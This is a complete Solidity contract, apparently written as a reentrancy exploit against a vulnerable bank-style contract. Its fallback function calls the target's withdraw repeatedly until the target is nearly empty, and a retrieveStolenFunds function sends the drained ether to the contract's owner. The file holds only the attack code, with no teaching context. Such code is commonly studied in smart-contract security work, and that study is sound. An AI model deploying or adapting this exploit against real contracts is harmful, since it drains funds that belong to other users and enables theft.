pragma solidity ^0.6.6;

interface targetInterface{
    function deposit() external payable;
    function withdraw(uint256 withdrawAmnt) external;
}

contract simpleReentrancyAttack{
    // initialization
    targetInterface bankAddress;
    address private owner;
    uint256 baseAmnt = 1 ether;
    // construction
    constructor(address _bankAddress) public{
        bankAddress = targetInterface(_bankAddress);
        owner = msg.sender;
    }

    function deposit() public payable{
        bankAddress.deposit{value: baseAmnt}();
    }

    function getTargetBalance() public view returns(uint256){
        return address(bankAddress).balance;
    }

    function initiateAttack() public payable{
        require(msg.sender == owner);
        bankAddress.withdraw(baseAmnt);
    }

    function retrieveStolenFunds() public{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }

    // fallback function is the rentrancy mechanism
    fallback () external payable{
        if (address(bankAddress).balance >= baseAmnt){
            bankAddress.withdraw(baseAmnt);
        }
    }

}